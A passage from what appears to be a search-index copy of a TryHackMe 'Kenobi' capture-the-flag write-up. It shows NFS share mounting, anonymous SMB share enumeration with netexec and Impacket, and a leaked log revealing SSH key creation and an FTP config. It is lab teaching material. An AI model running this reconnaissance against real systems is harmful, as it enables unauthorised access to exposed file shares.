[10.10.68.225]\n</code></pre>","tags":["samba","ProFtpd","path-variable-manipulation"]},{"location":"blog/2024/06/07/tryhackme-kenobi.html#nfs-port-111","title":"NFS - Port 111","text":"<p>It looks like there's a file share exported that we may be able to look at. </p> <pre><code>$ showmount -e $ip\n\nExport list for 10.10.68.225:\n/var *\n</code></pre> <p>We can mount the exported share with:</p> <pre><code>$ sudo mount -t nfs $ip:/var var -o nolock\n</code></pre> <p>And then we can list the contents of the exported share.</p> <p></p> <pre><code>$ tree\n.\n\u251c\u2500\u2500 backups\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 apt.extended_states.0\n\u251c\u2500\u2500 cache\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 apache2\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 mod_cache_disk\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 apparmor\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 apt\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 archives\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 lock\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 partial  [error opening dir]\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 pkgcache.bin\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 srcpkgcache.bin\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 debconf\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 config.dat\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 config.dat-old\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 passwords.dat\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 templates.dat\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 templates.dat-old\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ldconfig  [error opening dir]\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 samba\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 browse.dat\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 gencache.tdb\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 printing\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 printers.tdb\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 snapd\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 commands.db\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 names\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 sections\n\u251c\u2500\u2500 crash\n\u251c\u2500\u2500 lib\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 apache2\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 conf\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 enabled_by_maint\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 charset\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 localized-error-pages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 other-vhosts-access-log\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 security\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 serve-cgi-bin\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 module\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 enabled_by_maint\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 access_compat\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 alias\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 auth_basic\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 authn_core\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 authn_file\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 authz_core\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 authz_host\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 authz_user\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 autoindex\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 deflate\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 dir\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 env\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 filter\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 mime\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 mpm_event\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 negotiation\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u251c\u2500\u2500 setenvif\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 status\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 site\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 enabled_by_admin\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0         \u2514\u2500\u2500 000-default\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 apparmor\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 profiles\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 apt\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 cdroms.list\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 cdroms.list~\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 daily_lock\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 extended_states\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 keyrings\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 ubuntu-archive-keyring.gpg\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 lists\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 lock\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 partial  [error opening dir]\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 security.ubuntu.com_ubuntu_dists_xenial-security_InRelease\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 security.ubuntu.com_ubuntu_dists_xenial-security_main_binary-amd64_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 security.ubuntu.com_ubuntu_dists_xenial-security_main_binary-i386_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 security.ubuntu.com_ubuntu_dists_xenial-security_main_i18n_Translation-en\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 security.ubuntu.com_ubuntu_dists_xenial-security_multiverse_binary-amd64_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 security.ubuntu.com_ubuntu_dists_xenial-security_multiverse_binary-i386_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 security.ubuntu.com_ubuntu_dists_xenial-security_multiverse_i18n_Translation-en\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 security.ubuntu.com_ubuntu_dists_xenial-security_restricted_binary-amd64_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 security.ubuntu.com_ubuntu_dists_xenial-security_restricted_binary-i386_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 security.ubuntu.com_ubuntu_dists_xenial-security_restricted_i18n_Translation-en\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 security.ubuntu.com_ubuntu_dists_xenial-security_universe_binary-amd64_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 security.ubuntu.com_ubuntu_dists_xenial-security_universe_binary-i386_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 security.ubuntu.com_ubuntu_dists_xenial-security_universe_i18n_Translation-en\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 Ubuntu-Server%2016.04.6%20LTS%20%5fXenial%20Xerus%5f%20-%20Release%20amd64%20(20190226)_dists_xenial_main_binary-amd64_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 Ubuntu-Server%2016.04.6%20LTS%20%5fXenial%20Xerus%5f%20-%20Release%20amd64%20(20190226)_dists_xenial_Release\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 Ubuntu-Server%2016.04.6%20LTS%20%5fXenial%20Xerus%5f%20-%20Release%20amd64%20(20190226)_dists_xenial_Release.gpg\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-backports_InRelease\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-backports_main_binary-amd64_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-backports_main_binary-i386_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-backports_main_i18n_Translation-en\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-backports_universe_binary-amd64_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-backports_universe_binary-i386_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-backports_universe_i18n_Translation-en\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial_InRelease\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial_main_binary-amd64_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial_main_binary-i386_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial_main_i18n_Translation-en\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial_multiverse_binary-amd64_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial_multiverse_binary-i386_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial_multiverse_i18n_Translation-en\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial_restricted_binary-amd64_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial_restricted_binary-i386_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial_restricted_i18n_Translation-en\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial_universe_binary-amd64_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial_universe_binary-i386_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial_universe_i18n_Translation-en\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-updates_InRelease\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-updates_main_binary-amd64_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-updates_main_binary-i386_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-updates_main_i18n_Translation-en\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-updates_multiverse_binary-amd64_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-updates_multiverse_binary-i386_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-updates_multiverse_i18n_Translation-en\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-updates_restricted_binary-amd64_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-updates_restricted_binary-i386_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-updates_restricted_i18n_Translation-en\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-updates_universe_binary-amd64_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-updates_universe_binary-i386_Packages\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 us.archive.ubuntu.com_ubuntu_dists_xenial-updates_universe_i18n_Translation-en\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 mirrors\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 partial\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 periodic\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 update-stamp\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 dbus\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 machine-id\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 dhcp\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 dhclient.enp0s3.leases\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 dhclient.eth0.leases\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 dpkg\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 alternatives\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 awk\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 builtins.7.gz\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 c89\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 c99\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 cc\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 cpp\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 editor\n\n[...SNIP...]\n\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ureadahead\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 debugfs\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 usbutils\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 usb.ids\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 vim\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 addons\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 xml-core\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 catalog\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 xml-core\n\u251c\u2500\u2500 local\n\u251c\u2500\u2500 lock -&gt; /run/lock\n\u251c\u2500\u2500 log\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 alternatives.log\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 apache2\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 access.log\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 error.log\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 other_vhosts_access.log\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 apt\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 history.log\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 term.log\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 auth.log\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 bootstrap.log\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 btmp\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 dist-upgrade\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 dmesg\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 dpkg.log\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 faillog\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 fsck\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 checkfs\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 checkroot\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 installer\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 cdebconf\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 questions.dat\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 templates.dat\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 hardware-summary\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 initial-status.gz\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 lsb-release\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 media-info\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 partman\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 status\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 syslog\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 kern.log\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 lastlog\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 lxd\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 samba\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 cores  [error opening dir]\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 log.\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 log.10.2.113.252\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 log.192.168.1.147\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 log.netwars\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 log.nmap\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 log.nmbd\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 log.smbd\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 syslog\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 unattended-upgrades\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 unattended-upgrades-shutdown.log\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 wtmp\n\u251c\u2500\u2500 mail\n\u251c\u2500\u2500 opt\n\u251c\u2500\u2500 run -&gt; /run\n\u251c\u2500\u2500 snap\n\u251c\u2500\u2500 spool\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 cron\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 atjobs  [error opening dir]\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 atspool  [error opening dir]\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 crontabs  [error opening dir]\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 mail -&gt; ../mail\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 rsyslog  [error opening dir]\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 samba\n\u251c\u2500\u2500 tmp\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM  [error opening dir]\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw  [error opening dir]\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 systemd-private-818a59a15eb94a49bfd3f3793a9f2233-systemd-timesyncd.service-yD1FDa  [error opening dir]\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn  [error opening dir]\n\u2514\u2500\u2500 www\n    \u2514\u2500\u2500 html\n        \u251c\u2500\u2500 admin.html\n        \u251c\u2500\u2500 image.gif\n        \u251c\u2500\u2500 image.jpg\n        \u251c\u2500\u2500 index.html\n        \u2514\u2500\u2500 robots.txt\n\n166 directories, 2456 files\n</code></pre> <p>Looking at <code>/var/log/auth.log</code> we can see there's a user called <code>kenobi</code> (SHOCKER!!) with the home directory <code>/home/kenobi</code>. There's not really anything to do with that for now though.</p> <p>After looking over this briefly, it doesn't seem like there's anything SUPER juicy there, so we'll keep this in the cargo pocket and move on for now. </p>","tags":["samba","ProFtpd","path-variable-manipulation"]},{"location":"blog/2024/06/07/tryhackme-kenobi.html#samba-port-139","title":"SAMBA - Port 139","text":"<p>Using netexec, we can enumerate accessible shares on the server.</p> <pre><code>$ nxc smb $ip -u '' -p '' --shares\n\nSMB         10.10.68.225    445    KENOBI           [*] Windows 6.1 (name:KENOBI) (domain:) (signing:False) (SMBv1:True)\nSMB         10.10.68.225    445    KENOBI           [+] \\:\nSMB         10.10.68.225    445    KENOBI           [*] Enumerated shares\nSMB         10.10.68.225    445    KENOBI           Share           Permissions     Remark\nSMB         10.10.68.225    445    KENOBI           -----           -----------     ------\nSMB         10.10.68.225    445    KENOBI           print$                          Printer Drivers\nSMB         10.10.68.225    445    KENOBI           anonymous       READ\nSMB         10.10.68.225    445    KENOBI           IPC$                            IPC Service (kenobi server (Samba, Ubuntu))\n</code></pre> <p>Note that we have anonymous access to the <code>anonymous</code> share. </p> <p>Using <code>smbclient.py</code> from Impacket, we an enumerate the share. Seems like there's one file present, called <code>log.txt</code>. </p> <pre><code>$ smbclient.py anonymous:anonymous@$ip\n\nImpacket v0.12.0.dev1+20240523.75507.15eff880 - Copyright 2023 Fortra\n\nType help for list of commands\n\n# shares\nprint$\nanonymous\nIPC$\n\n# use anonymous\n# ls -la\n[-] SMB SessionError: code: 0xc000000f - STATUS_NO_SUCH_FILE - {File Not Found} The file %hs does not exist.\n# ls\ndrw-rw-rw-          0  Wed Sep  4 05:49:09 2019 .\ndrw-rw-rw-          0  Wed Sep  4 05:56:07 2019 ..\n-rw-rw-rw-      12237  Wed Sep  4 05:49:09 2019 log.txt\n\n# cat log.txt\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/kenobi/.ssh/id_rsa):\nCreated directory '/home/kenobi/.ssh'.\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour identification has been saved in /home/kenobi/.ssh/id_rsa.\nYour public key has been saved in /home/kenobi/.ssh/id_rsa.pub.\nThe key fingerprint is:\nSHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi\nThe key's randomart image is:\n+---[RSA 2048]----+\n|                 |\n|           ..    |\n|        . o. .   |\n|       ..=o +.   |\n|      . So.o++o. |\n|  o ...+oo.Bo*o  |\n| o o ..o.o+.@oo  |\n|  . . . E .O+= . |\n|     . .   oBo.  |\n+----[SHA256]-----+\n\n# This is a basic ProFTPD configuration file (rename it to\n# 'proftpd.conf' for actual use.  It establishes a single server\n# and a single anonymous login.  It assumes that you have a user/group\n# \"nobody\" and \"ftp\" for normal operation and anon.\n\nServerName                      \"ProFTPD Default Installation\"\nServerType                      standalone\nDefaultServer                   on\n\n# Port 21 is the standard FTP port.\nPort                            21\n\n# Don't use IPv6 support by default.\nUseIPv6                         off\n\n# Umask 022 is a good standard umask to prevent new dirs and files\n# from being group and world writable.\nUmask                           022\n\n# To prevent DoS attacks, set the maximum number of child processes\n# to 30.  If you need to allow more than 30 concurrent connections\n# at once, simply increase this value.  Note that this ONLY works\n# in standalone mode, in inetd mode you should use an inetd server\n# that allows you to limit maximum number of processes per service\n# (such as xinetd).\nMaxInstances                    